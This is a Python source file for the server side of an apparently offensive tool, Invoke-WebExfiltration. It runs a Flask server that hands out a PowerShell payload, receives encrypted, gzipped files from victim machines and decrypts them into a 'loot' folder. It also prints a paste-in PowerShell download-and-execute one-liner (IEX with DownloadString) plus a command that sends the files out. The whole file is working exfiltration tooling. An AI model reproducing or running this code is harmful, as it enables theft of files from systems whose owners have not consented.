#!/usr/bin/python3
import gzip
import os
import random
import string
import signal
import sys
import argparse
import socket
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from flask import Flask, request, Response

author = "Philipp Rieth"
version = "0.2"
default_port = 8000
default_targetdir = f"{os.getcwd()}/loot/"


def signal_handler(sig, frame):
    print('\n\nCtrl+C detected, exiting...')
    sys.exit(1)


def parse_args():
    """ all arguments needed by the application """
    parser = argparse.ArgumentParser(description='Exfiltrate files to a remote server in a secure, encrypted way',
                                     formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument('-a', "--address",
                        required=False,
                        type=str,
                        help='The domain, hostname or IP address that will be embedded into the PowerShell script. Default: local IP address')

    parser.add_argument('-p', "--port",
                        required=False,
                        type=str,
                        help=f'Listening port that will be used. Default: {default_port}')

    parser.add_argument('-P', '--password',
                        required=False,
                        type=str,
                        help='Password to use for decryption. Default: generate random password')

    parser.add_argument('-t', '--targetdir',
                        required=False,
                        type=str,
                        help=f"Loot directory to store the exfiltrated files in. Default: '{default_targetdir}'")

    parser.add_argument('--http',
                        required=False,
                        action='store_true',
                        default=False,
                        help='Use HTTP instead of HTTPS. Default: HTTPS')

    parser.add_argument('--verbose',
                        required=False,
                        action='store_true',
                        default=False,
                        help='Print verbose information on console. Default: False')

    return parser


def validate_args(parser):
    args = parser.parse_args()

    if not args.password:
        args.password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    if not args.port:
        args.port = default_port

    if not args.address:
        args.address = socket.gethostbyname(socket.gethostname())

    if not args.targetdir:
        args.targetdir = default_targetdir

    return args


class CouldNotDecryptError(Exception):
    pass


class IWE:
    def __init__(self, password: str):
        """

        :param password:
        """

        self.__password = password
        # SHA256 hash the plain text password
        self.password_sha256 = hashlib.sha256(password.encode()).digest()
        iwe_filename = 'Invoke-WebExfiltration.ps1'

        # Invoke-WebExfiltration need to be in the current working dir
        # This messy command makes sure to always load IWE.ps1 from the directory where
        # the iwe-server.py is located in. This is independent to the current PWD
        __location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
        try:
            with open(os.path.join(__location__, iwe_filename)) as f:
                self.powershell_iwe_script = f.read()
        except FileNotFoundError as e:
            print(f"[X] Error: Could not open '{iwe_filename}'. File not found")

    def __aes256_decrypt_bytes(self, aes256_cipher_bytes: bytes) -> bytes:
        """

        The first 16 bytes of the AES hex is the AES IV.
        The password is SHA256 hashed to get a 32 byte long password

        :param aes256_cipher_bytes:
        :return:
        """
        # extract the AES IV from the cipher text
        aes_iv = aes256_cipher_bytes[:16]
        aes_cipher_text = aes256_cipher_bytes[16:]

        try:
            cipher = AES.new(self.password_sha256, AES.MODE_CBC, aes_iv)
            plain_text = unpad(cipher.decrypt(aes_cipher_text), AES.block_size)

        except (ValueError, KeyError) as e:
            print("[X] Error: Incorrect decryption. Wrong password? Continuing...")
            raise CouldNotDecryptError

        return plain_text

    def aes256_decrypt_filename(self, aes_b64_filename: str) -> str:
        """
        Takes an AES256 encrypted base64 string and converts it back to the original file name

        The base64 string is packed the following way:
        Decode base64 > AES Hex bytes

        :param aes_b64_filename: the base64 file name to decrypt
        :return: returns the file name as a string
        """
        # decode the base64 string
        b64_decoded = base64.b64decode(aes_b64_filename)

        return self.__aes256_decrypt_bytes(b64_decoded).decode('utf-8')

    def aes256_decrypt_binary(self, aes_b64_enc: str) -> bytes:
        """
        Takes an encrypted, gzipped base64 string and converts it into a byte array.

        The base64 string is packed the following way:
        Decode base64 > decompress gzip > AES Hex bytes

        :param aes_b64_enc: base64 string to decrypt
        :return: returns a byte object ob the decrypted file
        """

        # decode the base64 string
        b64_decoded = base64.b64decode(aes_b64_enc)
        # decompress gzip bytes
        gzip_decoded = gzip.decompress(b64_decoded)

        return self.__aes256_decrypt_bytes(gzip_decoded)


def main():
    art = """
 _____  ____      ____  ________  
|_   _||_  _|    |_  _||_   __  | 
  | |    \ \  /\  / /    | |_ \_| 
  | |     \ \/  \/ /     |  _| _  
 _| |_     \  /\  /     _| |__/ | 
|_____|     \/  \/     |________| 
    """

    # catch CTRL+C
    signal.signal(signal.SIGINT, signal_handler)
    print(f"{art}\nInvoke-WebExfiltration v{version} \nby {author}\n")
    # Get the args
    parser = parse_args()
    args = validate_args(parser)

    proto = "https" if not args.http else 'http'
    target_url = f'{proto}://{args.address}:{args.port}/'

    print(f"URL:      {target_url}\n" 
          f"Password: {args.password}\n")
    print(f"Copy this into your PowerShell:\n"
          f"PS > IEX (New-Object Net.WebClient).DownloadString('{target_url}iwe')\n")
    print("Start exfiltrating files with:\n"
          "PS > ls * | IEX\n")

    print("Ready to receive files...\n")

    app = Flask(__name__)
    iwe = IWE(password=args.password)

    @app.route('/sendfile', methods=['POST'])
    def user():

        try:
            content = request.get_json()
        except Exception as e:
            raise e

        try:
            file_full_path = iwe.aes256_decrypt_filename(content['fn'])
            plaintext_bytes = iwe.aes256_decrypt_binary(content['ct'])
        except CouldNotDecryptError:
            return Response('Could not decrypt. Wrong password?', status=400)

        dirs = os.path.dirname(file_full_path).replace(':', '')
        filename = os.path.basename(file_full_path)

        useragent = ''.join(char for char in request.headers.get('User-Agent') if char not in ';:/\\*?><|')
        useragent = useragent.replace(' ', '_')
        client_ip = request.remote_addr
        random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        client_folder_name = f"{client_ip}_{useragent}_{random_string}"

        os.makedirs(os.path.join(args.targetdir, client_folder_name, dirs), exist_ok=True)
        with open(os.path.join(args.targetdir, client_folder_name, dirs, filename), "wb") as f:
            f.write(plaintext_bytes)

        return Response('Could not decrypt. Wrong password?', status=200)

    @app.route('/')
    @app.errorhandler(404)
    @app.errorhandler(405)
    def dont_know(a=1):
        """ Junk return for fun """
        return Response("¯\_(ツ)_/¯", status=200)

    @app.route('/iwe')
    def get_iwe_ps1():
        """
        Reads the current Invoke-WebExfiltration.ps1 file and returns it on request
        :return:
        """

        with open('Invoke-WebExfiltration.ps1') as f:
            iwe_file = f.read()

        iwe_file = iwe_file.replace('TARGET_PLACEHOLDER', target_url)

        return Response(iwe_file, status=200)


    if args.http:
        app.run(host='0.0.0.0', port=args.port)
    else:
        ssl_context = 'adhoc'
        # ToDo: implement custom cert support
        # if args.crt and args.key:
        #   ssl_context = ('local.crt', 'local.key')

        app.run(host='0.0.0.0', port=args.port, ssl_context=ssl_context, )


if __name__ == "__main__":
    main()
